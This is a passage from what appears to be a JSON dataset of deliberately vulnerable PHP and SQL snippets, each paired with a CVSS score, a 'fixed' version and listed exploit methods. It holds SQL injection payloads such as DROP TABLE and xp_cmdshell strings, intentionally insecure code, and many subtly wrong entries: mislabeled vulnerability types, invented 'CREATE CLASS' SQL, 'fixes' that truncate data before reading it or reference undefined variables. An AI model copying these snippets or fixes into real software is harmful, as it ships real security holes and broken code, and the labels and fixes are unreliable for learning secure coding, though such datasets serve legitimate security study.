        "vulnerability_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data);\n    }\n\n    public function readFromFile() {\n        return file_get_contents($this->filePath);\n    }\n}\n?>",
        "cvss_score": 4.3,
        "fixed_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data, LOCK_EX);\n    }\n\n    public function readFromFile() {\n        return file_get_contents($this->filePath);\n    }\n}\n?>",
        "exploit_ways": [
            "An attacker could race to modify the file between checks by two different processes.",
            "In a multi-user environment, one user could overwrite another's data by writing simultaneously.",
            "A malicious script could be triggered by concurrent read/write operations leading to data corruption."
        ]
    },
    "php_30": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $file = fopen('balances.txt', 'r+');\n    flock($file, LOCK_SH);\n    $balances = file_get_contents('balances.txt');\n    $balancesArray = json_decode($balances, true);\n    if (!isset($balancesArray[$userId])) {\n        $balancesArray[$userId] = 0;\n    }\n    $balancesArray[$userId] += $amount;\n    flock($file, LOCK_UN);\n    rewind($file);\n    fwrite($file, json_encode($balancesArray));\n    fclose($file);\n}",
        "cvss_score": 5.3,
        "fixed_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $file = fopen('balances.txt', 'r+');\n    flock($file, LOCK_EX);\n    ftruncate($file, 0);\n    rewind($file);\n    $balances = file_get_contents('balances.txt');\n    $balancesArray = json_decode($balances, true) ?: [];\n    if (!isset($balancesArray[$userId])) {\n        $balancesArray[$userId] = 0;\n    }\n    $balancesArray[$userId] += $amount;\n    fwrite($file, json_encode($balancesArray));\n    flock($file, LOCK_UN);\n    fclose($file);\n}",
        "exploit_ways": [
            "Multiple concurrent requests could lead to inconsistent balance updates due to shared access.",
            "An attacker could manipulate the file's contents between read and write operations, leading to incorrect balances.",
            "Timing attacks might be used to guess when locks are released, potentially allowing for more effective exploitation."
        ]
    },
    "php_31": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\n\\nclass FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        if (file_exists($this->filePath)) {\n            sleep(1); // Simulate delay\n            file_put_contents($this->filePath, $data);\n        } else {\n            throw new Exception(\"File not found.\");\n        }\n    }\n}",
        "cvss_score": 4.5,
        "fixed_code": "<?php\n\\nclass FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        $lockFile = $this->filePath . '.lock';\n        $fp = fopen($lockFile, 'c');\n        if (flock($fp, LOCK_EX)) { // acquire an exclusive lock\n            file_put_contents($this->filePath, $data);\n            flock($fp, LOCK_UN); // release the lock\n        }\n        fclose($fp);\n    }\n}",
        "exploit_ways": [
            "An attacker could create a race condition by rapidly deleting and recreating the target file, causing data corruption.",
            "By exploiting the delay in writing to the file, an attacker might overwrite the file with malicious content if another process writes at the same time.",
            "If the file path can be controlled or predicted, an attacker might attempt to write to a different file by racing against the file existence check."
        ]
    },
    "php_32": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "<?php\nfunction set_session_id($user_id) {\n    session_start();\n    $_SESSION['user_id'] = $user_id;\n}\n?>",
        "cvss_score": 2.1,
        "fixed_code": "<?php\nfunction set_session_id($user_id) {\n    session_start();\n    session_regenerate_id(true);\n    $_SESSION['user_id'] = $user_id;\n}\n?>",
        "exploit_ways": [
            "An attacker could provide a fixed session ID in the URL to hijack an authenticated user's session.",
            "By manipulating the session cookie, an attacker can maintain control over a user's session even after login.",
            "If the application does not regenerate session IDs upon login, an attacker with knowledge of a valid session ID can impersonate users."
        ]
    },
    "php_33": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction processRequest() {\n    $data = file_get_contents('php://input');\n    if ($data) {\n        // Simulate processing data which could be slow for large input\n        sleep(10);\n        echo \"Processed\";\n    }\n}\nprocessRequest();\n?>",
        "cvss_score": 4.3,
        "fixed_code": "<?php\nfunction processRequest() {\n    $data = file_get_contents('php://input');\n    if ($data) {\n        // Limit processing time to prevent DoS\n        set_time_limit(5);\n        // Simulate processing data\n        sleep(min(strlen($data) / 10, 5));\n        echo \"Processed\";\n    }\n}\nprocessRequest();\n?>",
        "exploit_ways": [
            "An attacker can send a very large payload to force the script to sleep for a long time, tying up server resources.",
            "Repeated requests with payloads causing the script to sleep can exhaust server capacity, leading to service unavailability.",
            "By sending multiple large payloads in quick succession, an attacker can degrade performance and disrupt legitimate users' access."
        ]
    },
    "php_34": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction processRequest($data) {\n    $decodedData = json_decode(base64_decode($data), true);\n    if ($decodedData['action'] === 'sleep') {\n        sleep(10);\n    }\n}\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    processRequest($_POST['payload']);\n}",
        "cvss_score": 3.4,
        "fixed_code": "<?php\nfunction processRequest($data) {\n    $decodedData = json_decode(base64_decode($data), true);\n    if (isset($decodedData['action']) && $decodedData['action'] === 'sleep') {\n        sleep(2); // Reduced sleep time to mitigate DoS risk\n    }\n}\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['payload'])) {\n    processRequest($_POST['payload']);\n}",
        "exploit_ways": [
            "An attacker could send multiple requests with payload containing {\"action\":\"sleep\"} to consume server resources.",
            "Crafting large JSON payloads can cause the server to spend excessive time decoding, leading to a denial of service.",
            "Sending malformed base64 strings as payload can trigger unexpected behavior and resource consumption."
        ]
    },
    "php_35": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction processRequest() {\n    $data = json_decode(file_get_contents('php://input'), true);\n    if (isset($data['delay'])) {\n        sleep(intval($data['delay']));\n    }\n}\nprocessRequest();\n?>",
        "cvss_score": 3.5,
        "fixed_code": "<?php\nfunction processRequest() {\n    $data = json_decode(file_get_contents('php://input'), true);\n    if (isset($data['delay'])) {\n        $maxDelay = 5; // Set a maximum delay time\n        $delay = intval($data['delay']);\n        if ($delay >= 0 && $delay <= $maxDelay) {\n            sleep($delay);\n        }\n    }\n}\nprocessRequest();\n?>",
        "exploit_ways": [
            "An attacker can send a large delay value to cause the server to hang for an extended period.",
            "By continuously sending requests with high delay values, the server's resources can be exhausted.",
            "Sending multiple requests simultaneously with long delays can create a denial-of-service condition."
        ]
    },
    "php_36": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $balance = file_get_contents(\"balances/$userId.txt\");\n    $newBalance = $balance + $amount;\n    sleep(1); // Simulating a delay\n    file_put_contents(\"balances/$userId.txt\", $newBalance);\n}",
        "cvss_score": 4.5,
        "fixed_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $filePath = \"balances/$userId.txt\";\n    $lockFile = fopen($filePath . \".lock\", \"c\");\n    if (flock($lockFile, LOCK_EX)) {\n        $balance = file_get_contents($filePath);\n        $newBalance = $balance + $amount;\n        sleep(1); // Simulating a delay\n        file_put_contents($filePath, $newBalance);\n        flock($lockFile, LOCK_UN);\n    }\n    fclose($lockFile);\n}",
        "exploit_ways": [
            "Multiple concurrent requests could lead to inconsistent balance updates.",
            "An attacker might manipulate the timing of their requests to double credit transactions.",
            "In rare cases, an attacker could exploit the delay to corrupt the file contents by interrupting writes."
        ]
    },
    "php_37": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "<?php\nsession_start();\nif (!isset($_SESSION['user_id'])) {\n    if (isset($_GET['PHPSESSID'])) {\n        session_id($_GET['PHPSESSID']);\n        session_start();\n    }\n}\n$_SESSION['authenticated'] = true;\necho 'Session started. User authenticated.';\n?>",
        "cvss_score": 4.0,
        "fixed_code": "<?php\nsession_start();\nif (!isset($_SESSION['user_id'])) {\n    session_regenerate_id(true);\n}\n$_SESSION['authenticated'] = true;\necho 'Session started. User authenticated.';\n?>",
        "exploit_ways": [
            "An attacker can create a session with their own PHPSESSID and trick the user into using it, thus taking over the user's session.",
            "Attackers can use URL parameters to fixate sessions on legitimate users, gaining unauthorized access if the user logs in.",
            "By manipulating the PHPSESSID parameter, attackers could attempt to predict or brute-force valid session IDs, leading to session hijacking."
        ]
    },
    "php_38": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "<?php\n\\nclass User {\n    private $secret;\n\n    public function __construct($secret) {\n        $this->secret = $secret;\n    }\n\n    public function displaySecret() {\n        echo $this->secret;\n    }\n}\n$user = new User(\"Sensitive Information\");\necho $user->displaySecret();\n?>",
        "cvss_score": 2.5,
        "fixed_code": "<?php\n\nclass User {\n    private $secret;\n\n    public function __construct($secret) {\n        $this->secret = $secret;\n    }\n\n    public function displaySecret() {\n        // Secret should not be displayed\n    }\n}\n$user = new User(\"Sensitive Information\");\n// Removed echo statement to prevent information disclosure\n?>",
        "exploit_ways": [
            "An attacker could access the script and view sensitive information directly.",
            "If part of a larger application, an attacker might exploit this to obtain database credentials or other secrets.",
            "In environments with error logging enabled, the secret could be logged unintentionally if exceptions occur."
        ]
    },
    "php_39": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\n$url = $_GET['url'];\nheader('Location: ' . $url);\nexit();\n?>",
        "cvss_score": 6.5,
        "fixed_code": "<?php\n$allowed_urls = ['https://example.com/page1', 'https://example.com/page2'];\n$url = $_GET['url'];\nif (in_array($url, $allowed_urls)) {\n    header('Location: ' . $url);\n} else {\n    header('Location: https://example.com/default');\n}\nexit();\n?>",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by setting the url parameter, e.g., https://attacker.com.",
            "Could use the vulnerability to bypass intended security measures by redirecting to unauthorized URLs.",
            "Inject crafted URLs that lead to phishing pages designed to steal user credentials."
        ]
    },
    "php_40": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = ['example.com', 'sub.example.com'];\n    $parsedUrl = parse_url($url);\n    if (in_array($parsedUrl['host'], $allowedHosts)) {\n        header('Location: ' . htmlspecialchars($url));\n        exit;\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $target = $_GET['redirect'];\n    safeRedirect($target);\n}\necho \"No redirection requested.\";",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = ['example.com', 'sub.example.com'];\n    $parsedUrl = parse_url($url);\n    if (in_array($parsedUrl['host'], $allowedHosts)) {\n        header('Location: ' . filter_var($url, FILTER_SANITIZE_URL));\n        exit;\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $target = $_GET['redirect'];\n    safeRedirect($target);\n}\necho \"No redirection requested.\";",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site using a crafted URL parameter.",
            "Could exploit the vulnerability to trick users into visiting phishing sites by manipulating the 'redirect' parameter.",
            "May attempt to use protocol-relative URLs or other URI schemes to perform unexpected redirects."
        ]
    },
    "php_41": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "<?php\r\nclass SecureApp {\r\n    public function displayPage() {\r\n        echo '<html><head><title>Secure Page</title></head><body><h1>Welcome!</h1></body></html>';\r\n    }\r\n}\r\n$app = new SecureApp();\r\n$app->displayPage();?>",
        "cvss_score": 4.2,
        "fixed_code": "<?php\r\nclass SecureApp {\r\n    public function displayPage() {\r\n        header('Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.example.com; object-src 'none';');\r\n        header('X-Frame-Options: SAMEORIGIN');\r\n        header('X-XSS-Protection: 1; mode=block');\r\n        header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');\r\n        echo '<html><head><title>Secure Page</title></head><body><h1>Welcome!</h1></body></html>';\r\n    }\r\n}\r\n$app = new SecureApp();\r\n$app->displayPage();?>",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page to perform XSS attacks.",
            "The absence of Content Security Policy allows loading of external, potentially harmful resources.",
            "Without X-Frame-Options or frame-ancestors CSP directive, the site may be framed in a clickjacking attack."
        ]
    },
    "php_42": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class SlowClass {\n    public function slowMethod() {\n        while(true) {}\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "class SafeClass {\n    public function safeMethod() {\n        // Add a timeout or condition to break the loop\n        for ($i = 0; $i < 1000; $i++) {}\n    }\n}",
        "exploit_ways": [
            "An attacker can call slowMethod, causing the server to become unresponsive.",
            "In a web application context, this could lead to excessive resource consumption and denial of service for other users.",
            "If part of a background task or cron job, it could indefinitely lock up system resources."
        ]
    },
    "php_43": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "<?php echo $_SERVER['PHP_SELF']; ?>",
        "cvss_score": 3.5,
        "fixed_code": "<?php // Removed direct output of server variable to prevent info disclosure ?>",
        "exploit_ways": [
            "An attacker can retrieve the full path of the current script, aiding in reconnaissance.",
            "This could be part of a larger attack where the script path is used to craft other attacks or locate other scripts on the server.",
            "By knowing the exact file location, attackers might guess other filenames or directories using directory traversal techniques."
        ]
    },
    "php_44": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "<?php $file = $_GET['file']; if (strpos($file, '..') === false && file_exists($file)) { include($file); } ?>",
        "cvss_score": 4.2,
        "fixed_code": "<?php $allowed_files = ['index.php', 'about.php', 'contact.php']; $file = $_GET['file']; if (in_array($file, $allowed_files) && file_exists($file)) { include($file); } ?>",
        "exploit_ways": [
            "An attacker can request a non-blacklisted file that resides on the server.",
            "If other PHP files are allowed but not listed, they could be included to leak sensitive information or execute code.",
            "Manipulating the 'file' parameter with URL encoding might bypass simple filters."
        ]
    },
    "php_45": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safeRedirect($url) {\n    $whitelist = [\"http://example.com\", \"https://example.com\"];\n    if (in_array($url, $whitelist)) {\n        header(\"Location: \" . filter_var($url, FILTER_SANITIZE_URL));\n        exit();\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $userInput = $_GET['redirect'];\n    safeRedirect(base64_decode($userInput));\n}\necho 'No redirect requested.';\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nfunction safeRedirect($url) {\n    $whitelist = [\"http://example.com\", \"https://example.com\"];\n    if (in_array($url, $whitelist)) {\n        header(\"Location: \" . filter_var($url, FILTER_SANITIZE_URL));\n        exit();\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $userInput = base64_decode($_GET['redirect']);\n    if (in_array($userInput, $whitelist)) {\n        safeRedirect($userInput);\n    } else {\n        echo 'Invalid redirect URL.';\n    }\n}\necho 'No redirect requested.';\n?>",
        "exploit_ways": [
            "An attacker can use a base64 encoded malicious URL like Y2F0ID9wYXNzd2Q= to attempt to redirect users to an unauthorized site.",
            "Crafting a base64 string that encodes 'https://malicious.com' could redirect legitimate users away from the intended site.",
            "Using obfuscated URLs in base64 could bypass simple checks and redirect to phishing sites."
        ]
    },
    "php_46": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = [\"example.com\", \"sub.example.com\"];\n    $parsedUrl = parse_url($url);\n    if (in_array($parsedUrl['host'], $allowedHosts)) {\n        header(\"Location: \" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8'));\n        exit;\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = [\"example.com\", \"sub.example.com\"];\n    $parsedUrl = parse_url($url);\n    if (isset($parsedUrl['host']) && in_array($parsedUrl['host'], $allowedHosts)) {\n        header(\"Location: \" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8'));\n        exit;\n    }\n}",
        "exploit_ways": [
            "An attacker can use a URL with an allowed host but malicious path to redirect users to a phishing site.",
            "Crafting a URL with port forwarding could redirect users to unintended services on the same domain.",
            "Using a URL with a fragment identifier to bypass checks and append malicious scripts or commands."
        ]
    },
    "php_47": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safe_redirect($url) {\n    $whitelist = ['https:\\\\/\\\\/example\\\\.com'];\n    foreach ($whitelist as $pattern) {\n        if (preg_match(\"/^$pattern$/\", $url)) {\n            header('Location: ' . $url);\n            exit;\n        }\n    }\n    echo 'Invalid URL';\n}\nsafe_redirect($_GET['redirect']);\n?>",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction safe_redirect($url) {\n    $whitelist = ['https://example.com'];\n    if (in_array($url, $whitelist)) {\n        header('Location: ' . $url);\n        exit;\n    }\n    echo 'Invalid URL';\n}\nsafe_redirect($_GET['redirect']);\n?>",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by setting the 'redirect' parameter to an external URL.",
            "They could use URL encoding to bypass simple filters, e.g., https%3A%2F%2Fexample.com%2Fmalicious.",
            "Crafting URLs with additional parameters that trick the regex, like 'https://example.com/?malicious=true'."
        ]
    },
    "php_48": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction slow_function() {\n    $result = '';\n    for ($i = 0; $i < 1000000; $i++) {\n        $result .= md5($i);\n    }\n    return $result;\n}\necho slow_function();\n?>",
        "cvss_score": 3.7,
        "fixed_code": "<?php\nfunction optimized_function() {\n    $result = '';\n    for ($i = 0; $i < 1000000; $i++) {\n        $result .= md5($i);\n    }\n    return substr($result, 0, 100); // Returning a limited part of the result\n}\necho optimized_function();\n?>",
        "exploit_ways": [
            "An attacker can trigger this function via web requests to consume server resources.",
            "Repeatedly calling this function can lead to excessive CPU usage and slow down the server.",
            "If placed in a loop, it can cause the server to become unresponsive."
        ]
    },
    "php_49": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebApp {\\n    public function render() {\\n        echo \"<html><head></head><body>Welcome to our site!</body></html>\";\\n    }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "class WebApp {\\n    public function render() {\\n        header('Content-Security-Policy: default-src \\u0027self\\u0027');\\n        header('X-Content-Type-Options: nosniff');\\n        header('X-XSS-Protection: 1; mode=block');\\n        header('X-Frame-Options: SAMEORIGIN');\\n        echo \"<html><head></head><body>Welcome to our site!</body></html>\";\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts via reflected XSS.",
            "Clickjacking attacks could be performed since there is no X-Frame-Options header set.",
            "MIME type sniffing might occur as there is no X-Content-Type-Options header."
        ]
    },
    "sql_0": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "CREATE FUNCTION GetUserDetails(username VARCHAR(50)) RETURNS TABLE AS $$\nBEGIN\n    RETURN QUERY EXECUTE 'SELECT * FROM users WHERE username = ''' || username || '''';\nEND;$$ LANGUAGE plpgsql;",
        "cvss_score": 7.2,
        "fixed_code": "CREATE FUNCTION GetUserDetails(username VARCHAR(50)) RETURNS TABLE AS $$\nBEGIN\n    RETURN QUERY EXECUTE 'SELECT * FROM users WHERE username = $1' USING username;\nEND;$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could inject a long string to cause buffer overflow and potentially execute arbitrary code.",
            "Injection of special SQL sequences like ';' followed by other commands can lead to unauthorized data access or modification.",
            "Using crafted input, an attacker might be able to manipulate the function's behavior, leading to a denial-of-service condition."
        ]
    },
    "sql_1": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "SELECT * FROM users WHERE username = '\" OR 1=1; -- \"'",
        "cvss_score": 8.6,
        "fixed_code": "import sqlite3\ndef safe_query(username):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username = ?\"\n    cursor.execute(query, (username,))\n    results = cursor.fetchall()\n    return results",
        "exploit_ways": [
            "An attacker could input '; DROP TABLE users; --' to delete the users table.",
            "Could use '; SELECT password FROM admin;' to extract passwords from an admin table.",
            "Injecting '; SLEEP(10); --' can cause a denial of service by delaying server response."
        ]
    },
    "sql_2": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "CREATE PROCEDURE escalate_privileges AS BEGIN EXEC sp_addrolemember 'db_owner', SUSER_SNAME(); END;",
        "cvss_score": 9.0,
        "fixed_code": "CREATE PROCEDURE safe_escalate_privileges @username NVARCHAR(128) AS BEGIN IF (SUSER_SNAME() = 'admin') EXEC sp_addrolemember 'db_owner', @username; END;",
        "exploit_ways": [
            "An attacker can execute the stored procedure to gain db_owner privileges if they have any access.",
            "If linked servers are configured, an attacker could use this procedure to escalate privileges across multiple databases.",
            "Exploiting SQL injection vulnerabilities elsewhere in the application could lead to execution of this procedure with unintended parameters."
        ]
    },
    "sql_3": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "CREATE TABLE users (\r\n    id INT PRIMARY KEY,\r\n    username VARCHAR(50),\r\n    password_hash VARCHAR(255)\r\n);\r\n\r\nINSERT INTO users (id, username, password_hash) VALUES (1, 'admin', 'cGFzc3dvcmQ='); -- Base64 for 'password'\r\n\r\nDELIMITER $$\r\nCREATE PROCEDURE login(IN p_username VARCHAR(50), IN p_password VARCHAR(255))\r\nBEGIN\r\n    DECLARE v_password_hash VARCHAR(255);\r\n    SELECT password_hash INTO v_password_hash FROM users WHERE username = p_username;\r\n    IF v_password_hash IS NOT NULL AND HEX(SHA1(p_password)) = HEX(v_password_hash) THEN\r\n        SELECT 'Login successful';\r\n    ELSE\r\n        SELECT 'Login failed';\r\n    END IF;\r\nEND$$\r\nDELIMITER ;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE TABLE users (\r\n    id INT PRIMARY KEY,\r\n    username VARCHAR(50),\r\n    password_hash VARCHAR(255)\r\n);\r\n\r\nINSERT INTO users (id, username, password_hash) VALUES (1, 'admin', SHA2('password', 256)); -- SHA2 hash for 'password'\r\n\r\nDELIMITER $$\r\nCREATE PROCEDURE login(IN p_username VARCHAR(50), IN p_password VARCHAR(255))\r\nBEGIN\r\n    DECLARE v_password_hash VARCHAR(255);\r\n    SELECT password_hash INTO v_password_hash FROM users WHERE username = p_username;\r\n    IF v_password_hash IS NOT NULL AND SHA2(p_password, 256) = v_password_hash THEN\r\n        SELECT 'Login successful';\r\n    ELSE\r\n        SELECT 'Login failed';\r\n    END IF;\r\nEND$$\r\nDELIMITER ;",
        "exploit_ways": [
            "An attacker can try common passwords like 'password' to guess the admin's credentials.",
            "If password hashing is weak, an attacker could use a rainbow table to crack the hash and gain access.",
            "Brute force attacks on the login procedure could be used to find valid username/password combinations."
        ]
    },
    "sql_4": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "CREATE PROCEDURE GetUserData (@username VARCHAR(50)) AS BEGIN DECLARE @sql NVARCHAR(MAX) SET @sql = 'SELECT * FROM Users WHERE username='''+@username+'''' EXEC sp_executesql @sql END",
        "cvss_score": 9.8,
        "fixed_code": "CREATE PROCEDURE GetUserData (@username VARCHAR(50)) AS BEGIN SELECT * FROM Users WHERE username = @username END",
        "exploit_ways": [
            "An attacker could input a payload like \"admin'; DROP TABLE Users; --\" to drop the Users table.",
            "The vulnerability can be used to exfiltrate data by appending UNION SELECT statements, e.g., \"admin' UNION SELECT password FROM Users WHERE username = 'admin--\".",
            "An attacker might attempt to escalate privileges using system stored procedures or functions within the injected SQL."
        ]
    },
    "sql_5": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "CREATE PROCEDURE dbo.UpdateUserPermissions\r\n(\r\n    @UserID INT,\r\n    @NewRole VARCHAR(50)\r\n)\r\nAS\r\nBEGIN\r\n    DECLARE @sql NVARCHAR(MAX);\r\n    SET @sql = N'UPDATE Users SET Role = ''' + @NewRole + ''' WHERE UserID = ' + CAST(@UserID AS NVARCHAR(10));\r\n    EXEC sp_executesql @sql;\r\nEND",
        "cvss_score": 9.0,
        "fixed_code": "CREATE PROCEDURE dbo.UpdateUserPermissions\r\n(\r\n    @UserID INT,\r\n    @NewRole VARCHAR(50)\r\n)\r\nAS\r\nBEGIN\r\n    UPDATE Users SET Role = @NewRole WHERE UserID = @UserID;\r\nEND",
        "exploit_ways": [
            "An attacker could modify the @NewRole parameter to 'admin' or another elevated role for any user.",
            "By setting @NewRole to a specially crafted string, an attacker can try to inject additional SQL commands to alter other tables or database settings.",
            "Using a UserID of -1 and setting @NewRole to '; DROP TABLE Users; --', an attacker could attempt to delete the Users table or perform other destructive actions."
        ]
    },
    "sql_7": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "CREATE PROCEDURE GetUserData (@user_id INT)\r\nAS\r\nBEGIN\r\n    DECLARE @sql NVARCHAR(MAX);\r\n    SET @sql = 'SELECT * FROM Users WHERE id = ' + CAST(@user_id AS NVARCHAR(10));\r\n    EXEC sp_executesql @sql;\r\nEND",
        "cvss_score": 8.6,
        "fixed_code": "CREATE PROCEDURE GetUserData (@user_id INT)\r\nAS\r\nBEGIN\r\n    SELECT * FROM Users WHERE id = @user_id;\r\nEND",
        "exploit_ways": [
            "An attacker can input a crafted user_id like '1; DROP TABLE Users' to delete the Users table.",
            "By using a crafted user_id like '1 UNION SELECT username, password FROM Admins', an attacker can extract admin credentials.",
            "Inputting '1; EXEC xp_cmdshell 'whoami'' could allow execution of system commands."
        ]
    },
    "sql_8": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "CREATE CLASS VulnerableClass {\n    PROCEDURE ExecuteQuery(query VARCHAR) {\n        EXECUTE IMMEDIATE query;\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "CREATE CLASS SafeClass {\n    PROCEDURE ExecuteQuery(query VARCHAR) {\n        DECLARE allowed_commands ARRAY OF STRING = ['SELECT', 'INSERT', 'UPDATE'];\n        DECLARE cmd_parts ARRAY OF STRING = SPLIT(query, ' ');\n        IF FIND(cmd_parts[0], allowed_commands) > 0 THEN\n            EXECUTE IMMEDIATE query;\n        ELSE\n            RAISE_ERROR('Invalid command');\n        END IF;\n    }\n}",
        "exploit_ways": [
            "An attacker can inject a DROP TABLE statement to delete database tables.",
            "They can use a UNION SELECT statement to retrieve sensitive data from other tables.",
            "Could input a malicious payload like 'SELECT * FROM users; DELETE FROM users' for data theft and destruction."
        ]
    },
    "sql_10": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "CREATE OR REPLACE CLASS vulnerable_class AS $$\nBEGIN\n    DECLARE buffer CHAR(10);\n    SELECT data INTO buffer FROM unsafe_table WHERE id = 1;\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 8.5,
        "fixed_code": "CREATE OR REPLACE CLASS vulnerable_class AS $$\nBEGIN\n    DECLARE buffer VARCHAR(255);\n    SELECT SUBSTRING(data, 1, 10) INTO buffer FROM unsafe_table WHERE id = 1;\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could insert a value longer than 10 characters into the unsafe_table to cause a buffer overflow.",
            "The overflow can be used to execute arbitrary code if combined with other vulnerabilities in the database system.",
            "Exploitation might lead to unauthorized access or privilege escalation within the database environment."
        ]
    },
    "sql_11": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "CREATE OR REPLACE FUNCTION execute_user_query(query TEXT) RETURNS TABLE AS $$\nBEGIN\n    RETURN QUERY EXECUTE query;\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 9.1,
        "fixed_code": "CREATE OR REPLACE FUNCTION execute_user_query(table_name TEXT, column_name TEXT, value TEXT) RETURNS TABLE AS $$\nBEGIN\n    RETURN QUERY EXECUTE format('SELECT * FROM %I WHERE %I = $1', table_name, column_name) USING value;\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker can inject 'users; DROP TABLE users' to delete the users table.",
            "They can retrieve sensitive data from other tables using SQL injection payloads.",
            "Could use time-based or error-based techniques to extract information without altering data."
        ]
    },
    "sql_12": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "CREATE CLASS VulnerableClass AS $$\nBEGIN\n    EXECUTE IMMEDIATE 'SELECT * FROM ' || input_table;\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 8.5,
        "fixed_code": "CREATE FUNCTION safe_select(input_table TEXT) RETURNS TABLE AS $$\nDECLARE\n    valid_tables TEXT[] := ARRAY['users', 'products']; -- List of allowed tables\nBEGIN\n    IF input_table = ANY(valid_tables) THEN\n        RETURN QUERY EXECUTE 'SELECT * FROM ' || quote_ident(input_table);\n    ELSE\n        RAISE EXCEPTION 'Invalid table name';\n    END IF;\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker can input 'users; DROP TABLE products' to delete a critical table.",
            "Using a table name like 'users; SELECT * FROM secrets' could lead to data exfiltration.",
            "Injecting crafted SQL can cause denial of service by executing expensive queries or operations."
        ]
    },
    "sql_13": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import sqlite3\n\ndef execute_query(database, user_input):\n    conn = sqlite3.connect(database)\n    cursor = conn.cursor()\n    query = f'SELECT * FROM users WHERE username = \"{user_input}\"'\n    cursor.execute(query)\n    results = cursor.fetchall()\n    conn.close()\n    return results",
        "cvss_score": 7.5,
        "fixed_code": "import sqlite3\n\ndef execute_query(database, user_input):\n    conn = sqlite3.connect(database)\n    cursor = conn.cursor()\n    query = 'SELECT * FROM users WHERE username = ?'\n    cursor.execute(query, (user_input,))\n    results = cursor.fetchall()\n    conn.close()\n    return results",
        "exploit_ways": [
